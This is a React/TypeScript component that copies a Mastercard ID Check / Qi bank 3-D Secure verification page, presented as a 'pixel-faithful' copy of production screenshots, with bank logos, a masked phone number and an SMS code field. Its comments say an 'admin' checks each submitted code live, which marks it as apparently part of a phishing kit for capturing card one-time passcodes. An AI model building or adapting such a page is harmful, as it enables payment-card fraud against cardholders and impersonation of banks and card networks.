import React, { useEffect, useMemo, useState } from 'react';

type Phase = 'method' | 'verify' | 'help' | 'processing' | 'failed';

export type AcsOtpChallengeProps = {
  orderRef?: string | null;
  phoneLast3?: string | null;
  lang?: string;
  otpAttempts?: number;
  otpMaxAttempts?: number;
  otpRemaining?: number;
  otpRetryNotice?: boolean;
  otpResendNotice?: boolean;
  resendCooldown?: number;
  resendLoading?: boolean;
  /** checking = waiting for admin result (stay on Verify). completed = only then show redirect. */
  externalState?: 'input' | 'checking' | 'failed' | 'idle' | 'completed';
  failReason?: string | null;
  onMethodNext?: () => void | Promise<void>;
  onSubmitOtp: (code: string) => void | Promise<void>;
  onResend?: () => void | Promise<void>;
  onRetry?: () => void;
  onCancel?: () => void;
  t?: (key: string, fallback?: string) => string;
};

function maskPhone(last3?: string | null) {
  const d = String(last3 || '').replace(/\D/g, '').slice(-3);
  return d ? `********${d}` : '********---';
}

/**
 * Pixel-faithful Mastercard ACS / Qi ID Check UI
 * Screens match production screenshots exactly (no extras).
 */
export function AcsOtpChallenge({
  phoneLast3,
  otpRetryNotice = false,
  otpResendNotice = false,
  resendCooldown = 0,
  resendLoading = false,
  externalState = 'input',
  failReason,
  onMethodNext,
  onSubmitOtp,
  onResend,
  onRetry,
  onCancel,
}: AcsOtpChallengeProps) {
  const [phase, setPhase] = useState<Phase>('method');
  const [helpFrom, setHelpFrom] = useState<Phase>('method');
  const [otp, setOtp] = useState('');
  const [error, setError] = useState('');
  const [attempt, setAttempt] = useState(1);
  const [submitting, setSubmitting] = useState(false);

  const phoneMask = useMemo(() => maskPhone(phoneLast3), [phoneLast3]);

  // Stay on Verify while checking OTP — only redirect AFTER correct (completed)
  const view: Phase =
    externalState === 'failed'
      ? 'failed'
      : externalState === 'completed'
        ? 'processing'
        : phase;

  // Wrong OTP from admin/poll: stay on Verify and show error (never jump to redirect)
  useEffect(() => {
    if (otpRetryNotice) {
      setSubmitting(false);
      setPhase('verify');
      setError('The code you entered is incorrect. Please try again.');
      setOtp('');
      setAttempt((a) => a + 1);
    }
  }, [otpRetryNotice]);

  useEffect(() => {
    if (externalState === 'input' || externalState === 'idle') {
      setSubmitting(false);
    }
    if (externalState === 'completed') {
      setSubmitting(false);
      setPhase('processing');
    }
    if (externalState === 'failed') {
      setSubmitting(false);
    }
  }, [externalState]);

  /** Next on Choose Method: ALWAYS go to Verify; fire API in background (never hang UI) */
  const handleMethodNext = () => {
    setError('');
    setOtp('');
    setAttempt(1);
    setPhase('verify');
    // Do not await — parent API must not freeze the Next button
    try {
      const p = onMethodNext?.();
      if (p && typeof (p as Promise<void>).then === 'function') {
        (p as Promise<void>).catch(() => {});
      }
    } catch {
      /* ignore */
    }
  };

  const handleSubmit = () => {
    if (submitting) return;
    const code = otp.replace(/\D/g, '');
    if (code.length < 4) {
      setError('The code you entered is incorrect. Please try again.');
      return;
    }
    setError('');
    setSubmitting(true);
    setPhase('verify');
    Promise.resolve(onSubmitOtp(code))
      .catch(() => {
        setError('The code you entered is incorrect. Please try again.');
        setSubmitting(false);
      });
    // Keep Verify visible until parent says completed (correct) or retry_otp (incorrect)
  };

  const handleResend = () => {
    setAttempt((a) => a + 1);
    setOtp('');
    setError('');
    try {
      const p = onResend?.();
      if (p && typeof (p as Promise<void>).then === 'function') {
        (p as Promise<void>).catch(() => {});
      }
    } catch {
      /* ignore */
    }
  };

  const openHelp = () => {
    setHelpFrom(phase === 'help' ? 'method' : phase);
    setPhase('help');
  };

  const Header = () => (
    <>
      <div className="acs-cancel-row">
        <button type="button" className="acs-link" onClick={() => onCancel?.()}>
          Cancel
        </button>
      </div>
      <div className="acs-logo-header">
        <div className="acs-bank">
          <img src="/acs/qi_logo.png" alt="Qi" className="acs-qi-img" />
        </div>
        <div className="acs-id-check">
          <img src="/acs/mastercard.png" alt="Mastercard" className="acs-mc-img" />
        </div>
      </div>
    </>
  );

  return (
    <div className="acs-shell" dir="ltr">
      <style>{ACS_CSS}</style>

      {view === 'failed' && (
        <div className="acs-screen">
          <Header />
          <h1 className="acs-h1">Authentication failed</h1>
          <p className="acs-p">
            {failReason === 'otp_attempts_exceeded'
              ? 'You have exceeded the maximum number of attempts.'
              : 'Payment authentication was not successful.'}
          </p>
          {onRetry && (
            <button type="button" className="acs-btn acs-btn-primary" onClick={onRetry}>
              Back
            </button>
          )}
        </div>
      )}

      {view === 'processing' && (
        <div className="acs-screen">
          <Header />
          <h1 className="acs-h1">Please wait while we redirect you...</h1>
          <p className="acs-p">Do not refresh or close this page.</p>
          <div className="acs-spinner" aria-hidden="true" />
        </div>
      )}

      {view === 'method' && (
        <div className="acs-screen">
          <Header />
          <h1 className="acs-h1">Choose Method</h1>
          <p className="acs-p">Please select the method to be verified</p>
          <label className="acs-radio">
            <input type="radio" name="acs-method" defaultChecked readOnly />
            <span className="acs-radio-text">SMS at {phoneMask}</span>
          </label>
          <button type="button" className="acs-btn acs-btn-primary" onClick={handleMethodNext}>
            Next
          </button>
          <div className="acs-footer">
            <button type="button" className="acs-link" onClick={openHelp}>
              Help
            </button>
          </div>
        </div>
      )}

      {view === 'verify' && (
        <div className="acs-screen">
          <Header />
          <h1 className="acs-h1">Verify</h1>
          <p className="acs-p">
            We have sent you a message with a code to your registered mobile number ending with{' '}
            {phoneMask}.
          </p>
          {(error || otpRetryNotice) && (
            <div className="acs-error" role="alert">
              {error || 'The code you entered is incorrect. Please try again.'}
            </div>
          )}
          {otpResendNotice && (
            <div className="acs-notice">A new code has been sent to your mobile number.</div>
          )}
          <label className="acs-field-label" htmlFor="acs-otp-input">
            Enter your 6 digit code ({attempt}):
          </label>
          <input
            id="acs-otp-input"
            className="acs-otp-input"
            type="tel"
            inputMode="numeric"
            autoComplete="one-time-code"
            maxLength={6}
            placeholder="------"
            value={otp}
            disabled={submitting || externalState === 'checking'}
            onChange={(e) => {
              setOtp(e.target.value.replace(/\D/g, '').slice(0, 6));
              setError('');
            }}
            onKeyDown={(e) => {
              if (e.key === 'Enter') e.preventDefault();
            }}
          />
          <button
            type="button"
            className="acs-btn acs-btn-primary"
            disabled={submitting || externalState === 'checking'}
            onClick={handleSubmit}
          >
            {submitting || externalState === 'checking' ? 'Checking...' : 'Submit'}
          </button>
          <button
            type="button"
            className="acs-btn acs-btn-secondary"
            disabled={resendLoading || resendCooldown > 0}
            onClick={handleResend}
          >
            {resendCooldown > 0 ? `Resend Code (${resendCooldown})` : 'Resend Code'}
          </button>
          <div className="acs-footer">
            <button type="button" className="acs-link" onClick={openHelp}>
              Help
            </button>
          </div>
        </div>
      )}

      {view === 'help' && (
        <div className="acs-screen">
          <Header />
          <h1 className="acs-h1">Verify</h1>
          <p className="acs-p">An OTP has been send to the specified mobile number.</p>
          <button
            type="button"
            className="acs-btn acs-btn-primary"
            onClick={() => setPhase(helpFrom === 'help' ? 'method' : helpFrom)}
          >
            Back
          </button>
        </div>
      )}
    </div>
  );
}

/** Exact production ACS layout (screenshots) */
const ACS_CSS = `
.acs-shell {
  width: 100%;
  max-width: 400px;
  margin: 0 auto;
  min-height: 100vh;
  background: #fff;
  color: #514c48;
  font-family: Arial, Helvetica, sans-serif;
  font-size: 15px;
  line-height: 18px;
  box-sizing: border-box;
  padding: 20px;
  text-align: left;
  word-wrap: break-word;
}
.acs-screen {
  display: flex;
  flex-direction: column;
  min-height: calc(100vh - 40px);
}
.acs-cancel-row {
  text-align: right;
  margin-bottom: 18px;
  min-height: 18px;
}
.acs-link {
  background: none;
  border: none;
  padding: 0;
  color: #00527a;
  font-size: 15px;
  font-family: Arial, Helvetica, sans-serif;
  cursor: pointer;
  text-decoration: none;
}
.acs-link:hover { text-decoration: underline; }
.acs-logo-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 30px;
}
.acs-qi-img {
  max-height: 42px;
  max-width: 120px;
  height: auto;
  display: block;
}
.acs-id-check {
  display: flex;
  align-items: center;
  gap: 7px;
  color: #1a1a1a;
  font-size: 15px;
  font-weight: 600;
}
.acs-mc-img {
  height: 24px;
  width: auto;
  display: block;
}
.acs-h1 {
  color: #00406e;
  font-size: 20px;
  font-weight: 700;
  line-height: 23px;
  margin: 0 0 25px;
  text-align: center;
}
.acs-p {
  margin: 0 0 25px;
  color: #514c48;
  font-size: 15px;
  line-height: 18px;
}
.acs-radio {
  display: block;
  position: relative;
  margin-bottom: 25px;
  cursor: pointer;
  min-height: 20px;
}
.acs-radio input {
  position: absolute;
  left: -99999px;
  height: 0;
  width: 0;
}
.acs-radio-text {
  display: inline-block;
  padding-left: 31px;
  position: relative;
  width: 100%;
  color: #514c48;
  font-size: 15px;
  line-height: 20px;
  cursor: pointer;
}
.acs-radio-text::before {
  content: " ";
  border: 2px solid #797979;
  border-radius: 50%;
  box-sizing: border-box;
  height: 20px;
  width: 20px;
  left: 0;
  top: 0;
  position: absolute;
}
.acs-radio input:checked + .acs-radio-text::before {
  background: #0077b0;
  border: none;
}
.acs-radio input:checked + .acs-radio-text::after {
  content: " ";
  border: 2px solid #fff;
  border-radius: 50%;
  box-sizing: border-box;
  height: 12px;
  width: 12px;
  left: 4px;
  top: 4px;
  position: absolute;
}
.acs-field-label {
  display: block;
  padding-bottom: 8px;
  color: #514c48;
  font-size: 15px;
}
.acs-otp-input {
  border: 1px solid #777;
  border-radius: 4px;
  height: 30px;
  letter-spacing: 10px;
  margin-bottom: 25px;
  padding: 3px 5px;
  text-align: center;
  width: 100%;
  font-size: 15px;
  color: #514c48;
  font-family: Arial, Helvetica, sans-serif;
  box-sizing: border-box;
}
.acs-otp-input:focus {
  border: 1px solid #0077b0;
  outline: none;
}
.acs-otp-input::placeholder {
  color: #999;
  letter-spacing: 10px;
}
.acs-btn {
  border: none;
  border-radius: 4px;
  box-shadow: none;
  font-family: Arial, Helvetica, sans-serif;
  font-weight: 700;
  font-size: 15px;
  margin-bottom: 16px;
  padding: 10px;
  text-align: center;
  width: 100%;
  cursor: pointer;
  line-height: 18px;
  display: block;
}
.acs-btn:disabled {
  opacity: 0.55;
  cursor: not-allowed;
}
.acs-btn-primary {
  background: linear-gradient(180deg, #0077b0, #00527a);
  color: #fff;
}
.acs-btn-primary:hover:not(:disabled) {
  background: #00527a;
}
.acs-btn-secondary {
  background: linear-gradient(180deg, #fff, #f6f2ec 100%, #fefefe 0);
  border: 1px solid #d8d1ca;
  color: #00527a;
}
.acs-btn-secondary:hover:not(:disabled) {
  background: #fff;
}
.acs-error {
  color: #b00020;
  margin-bottom: 16px;
  font-size: 14px;
}
.acs-notice {
  color: #00527a;
  margin-bottom: 16px;
  font-size: 14px;
}
.acs-footer {
  margin-top: auto;
  padding-top: 40px;
  align-self: flex-start;
}
.acs-spinner {
  width: 36px;
  height: 36px;
  margin: 28px auto;
  border: 3px solid #d8d1ca;
  border-top-color: #00527a;
  border-radius: 50%;
  animation: acs-spin 0.8s linear infinite;
}
@keyframes acs-spin { to { transform: rotate(360deg); } }
`;

export default AcsOtpChallenge;
